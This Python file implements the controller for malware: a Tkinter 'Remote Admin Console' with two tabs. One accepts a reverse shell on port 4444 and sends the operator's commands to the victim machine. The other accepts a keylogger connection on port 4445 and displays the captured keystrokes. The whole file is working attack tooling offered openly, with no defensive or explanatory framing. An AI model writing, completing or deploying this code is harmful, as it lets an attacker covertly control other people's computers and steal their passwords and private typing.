import socket
import threading
import tkinter as tk
from tkinter import scrolledtext, ttk

class KeyloggerServer:
    def __init__(self, root):
        self.root = root
        self.root.title("Remote Admin Console")
        self.root.geometry("800x600")
        
        # Create notebook (tabs)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(expand=True, fill='both')
        
        # Reverse Shell Tab
        self.shell_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.shell_tab, text="Reverse Shell")
        
        self.shell_output = scrolledtext.ScrolledText(self.shell_tab, state='disabled')
        self.shell_output.pack(expand=True, fill='both')
        
        self.shell_input = tk.Entry(self.shell_tab)
        self.shell_input.pack(fill='x', padx=5, pady=5)
        self.shell_input.bind("<Return>", self.send_shell_command)
        
        # Keylogger Tab
        self.keylog_tab = ttk.Frame(self.notebook)
        self.notebook.add(self.keylog_tab, text="Keylogger")
        
        self.keylog_output = scrolledtext.ScrolledText(self.keylog_tab, state='normal')
        self.keylog_output.pack(expand=True, fill='both')
        
        # Networking
        self.shell_socket = None
        self.keylog_socket = None
        self.client_addr = None
        
        # Start servers
        threading.Thread(target=self.start_shell_server, daemon=True).start()
        threading.Thread(target=self.start_keylog_server, daemon=True).start()
    
    def start_shell_server(self):
        self.shell_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.shell_server.bind(('0.0.0.0', 4444))
        self.shell_server.listen(1)
        
        self.shell_output_insert("Waiting for reverse shell connection on port 4444...")
        self.shell_socket, self.client_addr = self.shell_server.accept()
        self.shell_output_insert(f"Reverse shell connected from {self.client_addr}")
        
        # Start receiving shell output
        threading.Thread(target=self.receive_shell_output, daemon=True).start()
    
    def start_keylog_server(self):
        self.keylog_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.keylog_server.bind(('0.0.0.0', 4445))
        self.keylog_server.listen(1)
        
        self.keylog_output.insert('end', "Waiting for keylogger connection on port 4445...\n")
        self.keylog_socket, _ = self.keylog_server.accept()
        self.keylog_output.insert('end', "Keylogger connected!\n")
        
        # Start receiving keylogs
        threading.Thread(target=self.receive_keylogs, daemon=True).start()
    
    def receive_shell_output(self):
        while True:
            try:
                data = self.shell_socket.recv(4096)
                if not data:
                    break
                self.shell_output_insert(data.decode('utf-8', errors='replace'))
            except:
                break
        self.shell_output_insert("\nShell connection closed\n")
    
    def receive_keylogs(self):
        while True:
            try:
                data = self.keylog_socket.recv(1024)
                if not data:
                    break
                self.keylog_output.insert('end', data.decode('utf-8', errors='replace'))
                self.keylog_output.see('end')
            except:
                break
        self.keylog_output.insert('end', "\nKeylogger connection closed\n")
    
    def send_shell_command(self, event):
        cmd = self.shell_input.get()
        self.shell_input.delete(0, 'end')
        try:
            self.shell_socket.sendall((cmd + "\n").encode())
        except:
            self.shell_output_insert("Failed to send command\n")
    
    def shell_output_insert(self, text):
        self.shell_output.config(state='normal')
        self.shell_output.insert('end', text)
        self.shell_output.see('end')
        self.shell_output.config(state='disabled')

if __name__ == "__main__":
    root = tk.Tk()
    server = KeyloggerServer(root)
    root.mainloop()
